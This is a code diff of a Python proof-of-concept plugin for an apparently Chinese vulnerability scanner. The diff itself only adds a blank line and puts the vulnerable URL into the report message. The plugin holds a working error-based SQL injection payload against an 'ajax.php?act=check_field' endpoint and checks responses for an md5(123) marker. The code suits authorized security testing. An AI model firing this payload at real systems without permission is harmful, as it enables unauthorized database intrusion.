@@ -37,6 +37,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
+            
             arg = '{target}'.format(target=self.target)
             payloads = {
                 '/ajax.php?act=check_field&field_name=a%27%20and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x7e,md5(123),0x7e)))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)#',
@@ -50,7 +51,8 @@ class Poc(ABPoc):
                 code, head, res,errcode,_ = hh.http(target_url)
                        
                 if code == 200 and "202cb962ac59075b964b07152d234b70"in res:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
+                        target=self.target,name=self.vuln.name, url=url))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
